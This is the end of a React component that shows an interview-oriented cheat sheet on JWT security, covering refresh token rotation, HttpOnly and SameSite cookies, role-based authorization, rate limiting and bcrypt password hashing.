WHAT IF JWT IS STOLEN?
====================================================
Problem: Attacker Gets Token
Solution 1
------------
Short Expiration 15 Minutes, Attacker Has Limited Time
====================================================
Solution 2
------------
Refresh Token Rotation

Old Refresh Token
        ↓
    Used Once
        ↓
Generate New Refresh Token
        ↓
  Invalidate Old One (blacklist)
====================================================
Solution 3
------------
Store Refresh Token In Database
user_id, token_hash, expires_at
  Logout
   ↓
Delete Refresh Token (blacklist)
Token Becomes Invalid
====================================================
Solution 4
------------
Store Token Hash  Instead Of: jwt123abc
Store: hash(jwt123abc)
If Database Leaks
 ↓
Real Token Hidden

====================================================
Solution 5
------------
Device Tracking, Refresh Token Linked To
✓ Browser
✓ Device
✓ IP (optional)

Unknown Device
 ↓
Force Login Again
`}
</pre>
</div>
<div
  style={{
    background: "#111",
    color: "#00ff90",
    padding: "16px",
    borderRadius: "10px",
  }}
>
  <pre style={styles.code}>
  {`===================================================
WHY HTTPONLY COOKIE?
====================================================
Without HttpOnly
document.cookie
 ↓
Can Read Token

XSS/ CSRF Attack
 ↓
Token Stolen
====================================================
With HttpOnly
document.cookie
 ↓
Blocked
JS Cannot Read Token
Browser Still Sends Cookie
====================================================
CSRF PROTECTION
====================================================
Problem: User Logged In
      ↓
Visits Malicious Site
      ↓
Browser Sends Cookie
====================================================
Solution : sameSite:"strict"
OR
CSRF Token

====================================================
JWT INTERVIEW TRAPS
====================================================
Trap 1
--------
JWT Is NOT Encryption
Anyone Can Decode Payload
Never Store:
✗ Passwords
✗ Secrets
✗ Credit Cards
====================================================
Trap 2
--------
JWT Is Signed
Not Encrypted
Header.Payload.Signature
====================================================
Trap 3
--------
JWT Alone Does Not Mean Secure
Need:
✓ HTTPS
✓ HttpOnly
✓ Secure Cookie
✓ Expiration
====================================================
Trap 4
--------
JWT Cannot Be Destroyed Until Expiry
Solution: Use Refresh Token Store

====================================================
Trap 5
--------
localStorage vs HttpOnly Cookie

localStorage: Readable By JS
HttpOnly Cookie: Not Readable By JS

Preferred: HttpOnly Cookie
====================================================
ROLE BASED AUTHORIZATION
====================================================
Token
{
 userId:1,
 role:"admin"
}

Middleware
if(req.user.role !== "admin"){
 return res.status(403)
}
Authentication
 ↓
Who Are You?

Authorization
 ↓
What Can You Access?
====================================================
RATE LIMITING
====================================================
Prevent Brute Force
Login API
 ↓
5 Requests Per Minute

Too Many Requests
 ↓
429 Error
====================================================
PASSWORD STORAGE
====================================================
Wrong: password:"admin123"
Correct: bcrypt.hash(password,10)
Database: $2b$10$....
Never Store Plain Passwords
====================================================
MOST ASKED INTERVIEW ANSWER
====================================================
Secure JWT Using:
✓ HTTPS
✓ HttpOnly Cookies
✓ Secure Cookies
✓ SameSite Protection
✓ Short Access Token Expiry
✓ Refresh Token Rotation
✓ Token Revocation
✓ bcrypt Password Hashing
✓ Rate Limiting
✓ Role Based Authorization`}
</pre>
</div>
</div>
    </div>
    <ImageBanner />

    </>
  );
};

export default JwtTokens;